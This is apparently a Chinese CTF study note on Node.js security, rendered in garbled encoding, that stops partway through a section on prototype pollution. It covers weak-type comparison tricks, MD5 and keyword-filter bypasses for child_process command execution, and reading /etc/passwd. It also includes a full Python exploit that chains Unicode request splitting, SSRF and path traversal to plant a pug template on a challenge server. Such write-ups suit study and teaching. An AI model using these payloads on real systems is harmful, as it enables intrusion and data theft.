è¿™æ˜¯å½“å‰æ¨¡å—æ–‡ä»¶çš„ç»å¯¹è·¯å¾„(ç¬¦å·é“¾æ¥ä¼šè¢«è§£æ)\nexportså˜é‡æ˜¯é»˜è®¤èµ‹å€¼ç»™module.exports, å®ƒå¯ä»¥è¢«èµ‹äºˆæ–°å€¼, å®ƒä¼šæš‚æ—¶ä¸ä¼šç»‘å®šåˆ°module.exports\nmodule: åœ¨æ¯ä¸ªæ¨¡å—ä¸­, moduleçš„è‡ªç”±å˜é‡æ˜¯å¯¹è¡¨è¾¾å½“å‰æ¨¡å—çš„å¯¹è±¡çš„å¼•ç”¨. ä¸ºæ–¹ä¾¿èµ·è§, è¿˜å¯ä»¥é€šè¿‡å…¨å±€æ¨¡å—çš„exportsè®¿é—®module.exports moduleå®é™…ä¸Šä¸æ˜¯å…¨å±€çš„, è€Œæ˜¯æ¯ä¸ªæ¨¡å—æœ¬åœ°çš„\nrequireæ¨¡å—æ˜¯å¼•å…¥æ¨¡å—, jsonæˆ–è€…æœ¬åœ°æ–‡ä»¶, å¯ä»¥ä»node_moduleså¼•å…¥æ¨¡å—\n\n//å¼•å…¥jsonæ–‡ä»¶const jsonData = require(&#x27;./path/filename.json&#x27;);//å¼•å…¥ node_modules æ¨¡å—æˆ–è€… Node.js å†…ç½®æ¨¡å—const crypto = require(&#x27;crypto&#x27;);\n\nè‡ªè¡Œè®¾ç½®:\nglobal.charmersix=6\n\n\nç»å¸¸ä½¿ç”¨çš„å…¨å±€å˜é‡æ˜¯__dirname, __filename\nHTTPæœåŠ¡//å¼•å…¥httpæ ¸å¿ƒæ¨¡å—var http = require(&#x27;http&#x27;);//åˆ›å»ºä¸€ä¸ªæœåŠ¡var server = http.createServer();//ç»‘å®šé“¾æ¥server.on(&#x27;request&#x27;, function (res,rs)&#123;    console.log(res.method); //æ‰“å°è¯·æ±‚æ–¹å¼    rs.write(&#x27;hello,world&#x27;);  //è¿”å›æ•°æ®    rs.end(); //æ–­å¼€è¿æ¥&#125;)//å¯åŠ¨ç›‘å¬server.listen(8686,function ()&#123;    console.log(&#x27;è¯·è®¿é—®127.0.0.1:8686&#x27;)&#125;)\n\n\nchild_process(åˆ›å»ºå­è¿›ç¨‹)child_processæä¾›äº†å‡ ç§åˆ›å»ºå­è¿›ç¨‹çš„æ–¹å¼\n\nå¼‚æ­¥æ–¹æ³•: spawnã€execã€execFileã€fork\nåŒæ­¥æ–¹æ³•: spawnSyncã€execSyncã€execFileSync\n\nç»è¿‡ä¸Šé¢çš„åŒæ­¥å’Œå¼‚æ­¥æ€æƒ³çš„ç†è§£, åˆ›å»ºå­è¿›ç¨‹çš„åŒæ­¥å¼‚æ­¥æ–¹å¼åº”è¯¥ä¸éš¾ç†è§£\nåœ¨å¼‚æ­¥åˆ›å»ºè¿›ç¨‹æ—¶, spawnæ˜¯åŸºç¡€, å…¶ä»–çš„fork/exec/execFileéƒ½æ˜¯åŸºäºspawnæ¥ç”Ÿæˆçš„\nåŒæ­¥åˆ›å»ºè¿›ç¨‹å¯ä»¥ä½¿ç”¨child_process.spawnSync()ã€child_process.execSync()å’Œchild_process.execFileSync(), åŒæ­¥çš„æ–¹æ³•ä¼šé˜»å¡Node.jsäº‹ä»¶å¾ªç¯ã€æš‚åœä»»ä½•å…¶ä»–ä»£ç çš„æ‰§è¡Œ, ç›´åˆ°å­è¿›ç¨‹é€€å‡º.\nNode.jsç‰¹æ€§å¤§å°å†™ç‰¹æ€§toUpperCase()toLowerCase()\n\nå¯¹äºtoUpperCase(): å­—ç¬¦&quot;Ä±&quot;ã€&quot;Å¿&quot; ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º &quot;I&quot;ã€&quot;S&quot;å¯¹äºtoLowerCase(): å­—ç¬¦&quot;K&quot;ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º&quot;k&quot;(è¿™ä¸ªKä¸æ˜¯K)\nå¼±ç±»å‹æ¯”è¾ƒå¤§å°æ¯”è¾ƒconsole.log(1==&#x27;1&#x27;); //trueconsole.log(1&gt;&#x27;2&#x27;); //falseconsole.log(&#x27;1&#x27;&lt;&#x27;2&#x27;); //trueconsole.log(111&gt;&#x27;3&#x27;); //trueconsole.log(&#x27;111&#x27;&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;asd&#x27;&gt;1); //false\n\n\næ€»ç»“: æ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶, ä¼šä¼˜å…ˆå°†çº¯æ•°å­—å‹å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒ; è€Œå­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶, ä¼šå°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬åŒ–ä¸ºASCIIç ä¹‹åå†è¿›è¡Œæ¯”è¾ƒ, å› æ­¤å°±ä¼šå‡ºç°ç¬¬äº”è¡Œä»£ç è¿™ç§æƒ…å†µ; è€Œéæ•°å­—å‹å­—ç¬¦ä¸²ä¸ä»»ä½•æ•°å­—è¿›è¡Œæ¯”è¾ƒéƒ½æ˜¯false\næ•°ç»„æ¯”è¾ƒconsole.log([]==[]); //falseconsole.log([]&gt;[]); //falseconsole.log([6,2]&gt;[5]); //trueconsole.log([100,2]&lt;&#x27;test&#x27;); //trueconsole.log([1,2]&lt;&#x27;2&#x27;); //trueconsole.log([11,16]&lt;&#x27;10&#x27;); //false\n\n\næ€»ç»“: ç©ºæ•°ç»„ä¹‹é—´æ¯”è¾ƒæ°¸è¿œä¸ºfalse, æ•°ç»„ä¹‹é—´æ¯”è¾ƒåªæ¯”è¾ƒæ•°ç»„é—´çš„ç¬¬ä¸€ä¸ªå€¼, å¯¹ç¬¬ä¸€ä¸ªå€¼é‡‡ç”¨å‰é¢æ€»ç»“çš„æ¯”è¾ƒæ–¹æ³•, æ•°ç»„ä¸éæ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒ, æ•°ç»„æ°¸è¿œå°äºéæ•°å€¼å‹å­—ç¬¦ä¸², æ•°ç»„ä¸æ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒ, å–ç¬¬ä¸€ä¸ªä¹‹åæŒ‰å‰é¢æ€»ç»“çš„æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ\nä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰console.log(null==undefined); //trueconsole.log(null===undefined); //falseconsole.log(NaN==NaN); //falseconsole.log(NaN===NaN); //false\n\n\nå˜é‡æ‹¼æ¥console.log(5+[6,3]); //56,3console.log(&quot;5&quot;+6); //56console.log(&quot;5&quot;+[6,6]); //56,6console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6\n\n\nMD5çš„ç»•è¿‡a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)\n\na[x]=1&amp;b[x]=2\næ•°ç»„ä¼šè¢«è§£ææˆ[object Object]\na=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125; console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)\n\n\na=[1]b=[2] console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)\n\n\nç¼–ç ç»•è¿‡16è¿›åˆ¶ç¼–ç console.log(&quot;a&quot;===&quot;\\x61&quot;); //true\n\nUnicodeç¼–ç console.log(&quot;\\u0061&quot;===&quot;a&quot;); //true\n\nbaseç¼–ç eval(Buffer.from(&#x27;Y29uc29sZS5sb2coImhlbGxvIHdvcmxkIik7&#x27;,&#x27;base64&#x27;).toString());\n\n\nNode.jså±é™©å‡½æ•°çš„åˆ©ç”¨å‘½ä»¤æ‰§è¡Œ/ä»£ç æ‰§è¡Œexec()require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);\n\n\neval()console.log(eval(&quot;document.cookie&quot;)); //æ‰§è¡Œdocument.cookieconsole.log(&quot;document.cookie&quot;); //è¾“å‡ºdocument.cookie\n\næ–‡ä»¶è¯»å†™readFileSync()require(&#x27;fs&#x27;).readFile(&#x27;/etc/passwd&#x27;, &#x27;utf-8&#x27;, (err, data) =&gt; &#123; if (err) throw err; console.log(data);&#125;);\n\nreadFile()require(&#x27;fs&#x27;).readFileSync(&#x27;/etc/passwd&#x27;,&#x27;utf-8&#x27;)\n\nwriteFileSync()require(&#x27;fs&#x27;).writeFileSync(&#x27;input.txt&#x27;,&#x27;sss&#x27;);\n\nwriteFile()require(&#x27;fs&#x27;).writeFile(&#x27;input.txt&#x27;,&#x27;test&#x27;,(err)=&gt;&#123;&#125;)\n\nRCE_ByPassåŸå‹\nrequire(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);\n\nå­—ç¬¦æ‹¼æ¥\nrequire(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;calc&#x27;); //webä¸­+è®°å¾—urlç¼–ç ä¸€ä¸‹\\require(&#x27;child_process&#x27;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;calc&quot;);\n\n\n\nç¼–ç ç»•è¿‡\nrequire(&quot;child_process&quot;)[&quot;\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;);require(&quot;child_process&quot;)[&quot;\\u0065\\u0078\\u0065\\u0063\\u0053\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;);eval(Buffer.from(&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdjYWxjJyk7&#x27;,&#x27;base64&#x27;).toString());\n\n\næ¨¡æ¿æ‹¼æ¥\nrequire(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;calc&#x27;)\n\n\nå…¶ä»–å‡½æ•°\nrequire(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ args* require(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]); require(&quot;child_process&quot;).spawnSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]); require(&quot;child_process&quot;).execFileSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]);\n\nNode.jsä¸­çš„ssrfé€šè¿‡æ‹†åˆ†è¯·æ±‚å®ç°çš„ssrfæ”»å‡»\nåŸç†è™½ç„¶ç”¨æˆ·å‘å‡ºçš„HTTPè¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸², ä½†node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡º. JavaScriptæ”¯æŒUnicodeå­—ç¬¦ä¸², å› æ­¤å°†ä»–ä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„Unicodeç¼–ç . å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚, Node.jsé»˜è®¤ä½¿ç”¨latin1, è¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç , ä¸èƒ½è¡¨ç¤ºé«˜ç¼–ç çš„Unicodeå­—ç¬¦, ç›¸å, è¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚\n&gt; v = &quot;/caf\\u&#123;E9&#125;\\u&#123;01F436&#125;&quot;&#x27;/cafÃ©ğŸ¶&#x27;&gt; Buffer.from(v,&#x27;latin1&#x27;).toString(&#x27;latin1&#x27;)&#x27;/cafÃ©=6&#x27;\n\n\nCrlf HTTPå¤´æ³¨å…¥&gt; require(&#x27;http&#x27;).get(&#x27;http://example.com/\\r\\n/test&#x27;)._header&#x27;GET //test HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n&#x27;\n\n\né€šè¿‡crlfç»“åˆssrfåˆ©ç”¨\né€šè¿‡ä¸€ä¸ªé¢˜ç›®å­¦ä¹ ä¸€ä¸‹\næºç \nvar express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;); // å¤„ç†æ–‡ä»¶è·¯å¾„var http = require(&#x27;http&#x27;);var pug = require(`pug`); // æ¨¡æ¿æ¸²æŸ“var morgan = require(&#x27;morgan&#x27;); // æ—¥å¿—ä¸­é—´ä»¶const multer = require(&#x27;multer&#x27;); // ç”¨äºå¤„ç†multipart/form-dataç±»å‹çš„è¡¨å•æ•°æ®ï¼Œå®ç°ä¸Šä¼ åŠŸèƒ½ï¼›ä¸ªäººä¸€èˆ¬ä½¿ç”¨formidableå®ç°ä¸Šä¼ // å°†ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨./dist[è‡ªåŠ¨åˆ›å»º]è¿”å›ä¸€ä¸ªåä¸ºfileçš„æ–‡ä»¶æ•°ç»„app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));// ä½¿ç”¨ç®€åŒ–ç‰ˆæ—¥å¿—app.use(morgan(&#x27;short&#x27;));// é™æ€æ–‡ä»¶è·¯ç”±app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#x27;/template&#x27;)))app.get(&#x27;/&#x27;, function (req, res) &#123;    // GETæ–¹æ³•è·å–actionå‚æ•°    var action = req.query.action ? req.query.action : &quot;index&quot;;    // actionä¸­ä¸èƒ½åŒ…å«/ &amp; \\    if (action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;)) &#123;        res.send(&quot;Errrrr, You have been Blocked&quot;);    &#125;    // å°†/template/[action].pugæ¸²æŸ“æˆhtmlè¾“å‡ºåˆ°æ ¹ç›®å½•    file = path.join(__dirname + &#x27;/template/&#x27; + action + &#x27;.pug&#x27;);    var html = pug.renderFile(file);    res.send(html);&#125;);app.post(&#x27;/file_upload&#x27;, function (req, res) &#123;    var ip = req.connection.remoteAddress; // remoteAddressæ— æ³•ä¼ªé€ ï¼Œå› ä¸ºTCPæœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¼ªé€ æºIPä¼šå¯¼è‡´æ— æ³•å®ŒæˆTCPè¿æ¥    var obj = &#123;msg: &#x27;&#x27;,&#125;    // è¯·æ±‚å¿…é¡»æ¥è‡ªlocalhost    if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;        obj.msg = &quot;only admin&#x27;s ip can use it&quot;        res.send(JSON.stringify(obj));        return    &#125;    fs.readFile(req.files[0].path, function (err, data) &#123;        if (err) &#123;            obj.msg = &#x27;upload failed&#x27;;            res.send(JSON.stringify(obj));        &#125; else &#123;            // æ–‡ä»¶è·¯å¾„ä¸º/uploads/[mimetype]/filenameï¼Œmimetypeå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šå®ç°å°†æ–‡ä»¶å­˜å‚¨è‡³/templateå¹¶åˆ©ç”¨actionæ¸²æŸ“åˆ°ç•Œé¢            var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if (!fs.existsSync(__dirname + file_path)) &#123;                try &#123;                    fs.mkdirSync(__dirname + file_path)                &#125; catch (error) &#123;                    obj.msg = &quot;file type error&quot;;                    res.send(JSON.stringify(obj));                    return                &#125;            &#125;            try &#123;                fs.writeFileSync(dir_file, data)                obj = &#123;msg: &#x27;upload success&#x27;, filename: file_path + file_name&#125;            &#125; catch (error) &#123;                obj.msg = &#x27;upload failed&#x27;;            &#125;            res.send(JSON.stringify(obj));        &#125;    &#125;)&#125;)// æŸ¥çœ‹é¢˜ç›®æºç app.get(&#x27;/source&#x27;, function (req, res) &#123;    res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;);app.get(&#x27;/core&#x27;, function (req, res) &#123;    var q = req.query.q;    var resp = &quot;&quot;;    if (q) &#123;        var url = &#x27;http://localhost:8081/source?&#x27; + q        console.log(url)        // å¯¹urlå­—ç¬¦è¿›è¡Œwaf        var trigger = blacklist(url);        if (trigger === true) &#123;            res.send(&quot;error occurs!&quot;);        &#125; else &#123;            try &#123;                // nodeå¯¹/sourceå‘å‡ºè¯·æ±‚ï¼Œæ­¤å¤„å¯ä»¥åˆ©ç”¨å­—ç¬¦ç ´åè¿›è¡Œåˆ‡åˆ†æ”»å‡»è®¿é—®/file_uploadè·¯ç”±(â—ï¸æ­¤è¯·æ±‚å‘å‡ºè€…ä¸ºlocalhostä¸»æœº)ï¼Œå®ç°å¯¹remoteAddressçš„ç»•è¿‡                http.get(url, function (resp) &#123;                    resp.setEncoding(&#x27;utf8&#x27;);                    resp.on(&#x27;error&#x27;, function (err) &#123;                        if (err.code === &quot;ECONNRESET&quot;) &#123;                            console.log(&quot;Timeout occurs&quot;);                        &#125;                    &#125;);                    // è¿”å›ç»“æœè¾“å‡ºåˆ°/core                    resp.on(&#x27;data&#x27;, function (chunk) &#123;                        try &#123;                            resps = chunk.toString();                            res.send(resps);                        &#125; catch (e) &#123;                            res.send(e.message);                        &#125;                    &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;                        res.send(e.message);                    &#125;);                &#125;);            &#125; catch (error) &#123;                console.log(error);            &#125;        &#125;    &#125; else &#123;        res.send(&quot;search param &#x27;q&#x27; missing!&quot;);    &#125;&#125;)// å…³é”®å­—waf åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å®ç°ç»•è¿‡function blacklist(url) &#123;    var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\\&quot;&quot;, &quot;&#x27;&quot;, &quot;!&quot;];    var arrayLen = evilwords.length;    for (var i = 0; i &lt; arrayLen; i++) &#123;        const trigger = url.includes(evilwords[i]);        if (trigger === true) &#123;            return true        &#125;    &#125;&#125;var server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;)\n\næ”»å‡»æµç¨‹\n\n\nå¯¹/coreè·¯ç”±å‘èµ·åˆ‡åˆ†æ”»å‡», è¯·æ±‚/coreçš„åŒæ—¶è¿˜å‘/sourceè·¯ç”±å‘å‡ºä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚\nç”±äº/è·¯ç”±æ˜¯å…ˆè¯»å–/templateç›®å½•ä¸‹çš„pugæ–‡ä»¶å†å°†å…¶æ¸²æŸ“åˆ°å½“å‰ç•Œé¢, å› æ­¤åº”è¯¥ä¸Šä¼ åŒ…å«å‘½ä»¤æ‰§è¡Œçš„pugæ–‡ä»¶, æ–‡ä»¶è™½ç„¶é»˜è®¤ä¸Šä¼ è‡³/upload/ç›®å½•ä¸‹, ä½†å¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šå°†æ–‡ä»¶ä¸Šä¼ åˆ°/templateç›®å½•\nè®¿é—®ä¸Šä¼ åˆ°/templateç›®å½•ä¸‹åŒ…å«å‘½ä»¤æ‰§è¡Œçš„pugæ–‡ä»¶\n\n\nå¤§æ¦‚çœ‹ä¸€ä¸‹å‡ ä¸ªè·¯ç”±ï¼š\n\n/ï¼šä¼šåŒ…å«/templateç›®å½•ä¸‹çš„ä¸€ä¸ªpugæ¨¡æ¿æ–‡ä»¶å¹¶ç”¨pubæ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“\n/sourceï¼šå›æ˜¾æºç \n/file_uploadï¼šé™åˆ¶äº†åªèƒ½ç”±127.0.0.1çš„ipå°†æ–‡ä»¶ä¸Šä¼ åˆ°uploadsç›®å½•é‡Œé¢ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œssrfã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶mimetypeè¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä»è€Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°ä»»æ„ç›®å½•ã€‚\n/coreï¼šé€šè¿‡qå‘å†…ç½‘çš„8081ç«¯å£ä¼ å‚ï¼Œç„¶åè·å–æ•°æ®å†è¿”å›å¤–ç½‘ï¼Œå¹¶ä¸”å¯¹urlè¿›è¡Œé»‘åå•çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿™é‡Œçš„é»‘åå•å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚\n\n\nnodejsåœ¨ç‰ˆæœ¬å·å°äº8.xçš„æ—¶å€™å­˜åœ¨unicodeå­—ç¬¦æŸåå¯¼è‡´çš„æ¼æ´ï¼Œè€Œè¿™ä¸ªé¢˜ç›®çš„ç‰ˆæœ¬åˆšå¥½å¯¹çš„ä¸Šï¼ˆä½†æ˜¯buuä¸Šçš„è¿™ä¸ªé¢˜å¹¶æ²¡æœ‰è¯´ç‰ˆæœ¬ï¼‰ï¼Œç®€å•æ¥è¯´å°±æ˜¯Unicodeåœ¨è§£æçš„æ—¶å€™ç”±äºè§£ç çš„ç±»å‹é—®é¢˜å¯¼è‡´éƒ¨åˆ†è¢«æˆªæ–­ï¼Œå­—ç¬¦å‡ºç°å˜å½¢ï¼Œè€ŒåŸå­—ç¬¦å¹¶éä¼šè¢«è½¬ä¹‰çš„å±é™©å­—ç¬¦é€ æˆçš„å®‰å…¨æ¼æ´ï¼Œå…·ä½“å°±æ˜¯å…ˆçŸ¥ç¤¾åŒºè¿™ç¯‡æ–‡ç« https://xz.aliyun.com/t/2894#toc-2\næ‰€ä»¥æ„é€ ä¸€ä¸‹payloadï¼Œé€šè¿‡æ¢è¡Œç¬¦ä½¿å¾—æœåŠ¡å™¨åœ¨coreä¸­å‘å‡ºçš„ä¸€æ¬¡httpè¯·æ±‚å˜æˆä¸¤æ¬¡ï¼Œå¹¶ä¸”ç¬¬äºŒæ¬¡è¯·æ±‚å†…å®¹æˆ‘ä»¬å®Œå…¨å¯æ§å¯ä»¥å…ˆå»uploadç›®å½•ä¸Šä¼ æ–‡ä»¶æŠ“ä¸€ä¸ªåŒ…ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„æ¨¡æ¿ï¼Œæ„é€ ä¸€ä¸‹ï¼Œèµµæ€»å’Œå‡ºé¢˜äººæœ‰ä¸¤å¥—ä¸åŒçš„è„šæœ¬æ„é€ å­—ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªäººè¯´æ˜è¿™äº›å­—ç¬¦æ˜¯æ€ä¹ˆæ„é€ å‡ºæ¥çš„ï¼Œå¹¶ä¸”ä¸¤ä¸ªè„šæœ¬ä¸äº’é€šï¼Œåˆ†åˆ«èƒ½ç”¨ï¼Œä½†æ˜¯å°è¯•ç”¨èµµæ€»çš„è„šæœ¬æ”¾ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„payloadæ—¶ç›´æ¥æŠŠbuuçš„ç¯å¢ƒæ‰“åˆ°äº†404ã€‚ã€‚ã€‚è¢«è¿«é‡æ–°å¼€ç¯å¢ƒ\nå…³äºwafçš„ç»•è¿‡ï¼Œæƒ³è¿‡ç›´æ¥äºŒæ¬¡ç¼–ç ç»•è¿‡ï¼Œå› ä¸ºè¿™ç§ssrfå‘åˆ°æœåŠ¡å™¨ä¸€æ¬¡è§£ç ï¼ŒæœåŠ¡å™¨å†å‘é€åˆ°æœåŠ¡å™¨äºŒæ¬¡è§£ç ï¼Œè€Œæ£€æµ‹åªå‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡è§£ç æ—¶ï¼ŒäºŒæ¬¡ç¼–ç ç†è®ºä¸Šè¶…çº§ç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œç¼–ç éœ€è¦æŠŠæ•´ä¸ªpayloadç¼–ç ä¸€éï¼Œå¯¼è‡´çš„ç»“æœå°±æ˜¯ç¬¬äºŒä¸ªhttpåŒ…çš„éƒ¨åˆ†å†…å®¹ä¹Ÿæ¥äº†ä¸ªäºŒæ¬¡ç¼–ç ï¼Œæ¯”å¦‚filenameé‚£é‡Œï¼Œåœ¨ç¬¬äºŒæ¬¡å‘åŒ…çš„æ—¶å€™å±äºheaderå†…å®¹ï¼ŒäºŒæ¬¡ç¼–ç ä½†è§£ç åªæœ‰ä¸€æ¬¡ï¼ˆè§£ç åªå¯¹postå’Œgetæäº¤çš„æ•°æ®è¿›è¡Œï¼‰ï¼Œä¼šå¯¼è‡´æ–‡ä»¶åæœ‰é—®é¢˜ï¼Œä½†æ˜¯é‚£é‡Œå¦‚æœåªç¼–ç ä¸€æ¬¡å°±ä¼šé€ æˆblacklisté‡Œé¢çš„å¼•å·é™åˆ¶è¿‡ä¸å»ï¼Œæ‰€ä»¥è¯´åˆ°åº•è¿˜æ˜¯éœ€è¦ç”¨æˆªæ–­å­—ç¬¦è¿™ç§ç¼–ç æ–¹å¼å»æ„é€ ä¸€ä¸ªå®Œå…¨æ— å…³çš„å­—ç¬¦è€Œæˆªæ–­åå´å®Œå…¨å¯åˆ©ç”¨çš„æ–¹å¼å»æ”»å‡»\n\nexp\nimport urllib.parseimport requestspayload = &#x27;&#x27;&#x27; HTTP/1.1POST /file_upload HTTP/1.1Host: 127.0.0.1:8081Content-Length: 266Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://127.0.0.1:8081Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG01qmiZ5h6Ap0QScUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://127.0.0.1:8081/?action=uploadAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryG01qmiZ5h6Ap0QScContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;Content-Type: ../templatedoctype htmlhtml  head    style      include ../../../../../../../flag.txt------WebKitFormBoundaryG01qmiZ5h6Ap0QSc--GET / HTTP/1.1test:&#x27;&#x27;&#x27;.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)def payload_encode(raw):    ret = u&quot;&quot;    for i in raw:        ret += chr(0x0100+ord(i))    return retpayload = payload_encode(payload)print(payload)r = requests.get(&#x27;http://057e3adb-a0dd-4ef8-b06c-b64f535de269.node4.buuoj.cn:81/core?q=&#x27; + urllib.parse.quote(payload))print(r.text)\n\nè¿è¡Œ, ç„¶åè®¿é—®http://057e3adb-a0dd-4ef8-b06c-b64f535de269.node4.buuoj.cn:81/?action=shellå³å¯\nNode.jsåŸå‹é“¾æ±¡æŸ“prototypeå’Œ__proto__åœ¨JavaScriptä¸­, prototypeå¯¹è±¡æ˜¯å®ç°é¢å‘å¯¹è±¡çš„ä¸€ä¸ªé‡è¦æœºåˆ¶\nå®ƒæ˜¯å‡½æ•°æ‰€ç‹¬æœ‰çš„, å®ƒæ˜¯ä»ä¸€ä¸ªå‡½æ•°æŒ‡å‘ä¸€ä¸ªå¯¹è±¡\nå®ƒçš„å«ä¹‰æ˜¯å‡½æ•°çš„åŸå‹å¯¹è±¡, ä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°æ‰€åˆ›å»ºçš„å®ä¾‹çš„åŸå‹å¯¹è±¡\nå®ƒå°±ç›¸å½“äºæ˜¯ç±»çš„ä¸€ä¸ªå®ä¾‹çš„æ¨¡æ¿, åŸå‹çš„å¯¹è±¡. ç”Ÿæˆçš„å¯¹è±¡éƒ½ä¼šå‚ç…§è¿™ä¸ªåŸå‹å¯¹è±¡; ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡æ—¶, å¦‚æœè‡ªå·±æ²¡æœ‰çš„å±æ€§prototypeæœ‰, å°±ä¼šç»§æ‰¿æ­¤å±æ€§, æœ‰çš„è¯åˆ™ä¸ä¼šè¦†ç›–\nä¾‹å¦‚ä¸‹é¢è¿™æ®µjsä»£ç \nfunction Foo()&#123;    this.bar = 1&#125;Foo.prototype.show = function show()&#123;    console.log(this.bar)&#125;let foo = new Foo()foo.show()\n\n\nå¯ä»¥çœ‹åˆ°, æˆ‘ä»¬å¯ä»¥é€šè¿‡prototypeå±æ€§, æŒ‡å‘åˆ°è¿™ä¸ªå‡½æ•°çš„åŸå‹å¯¹è±¡ä¸­ç„¶ååˆ›å»ºä¸€ä¸ªshow()å‡½æ•°, åŠŸèƒ½è¾“å‡ºä¸ºthis.bar\n\næˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹ 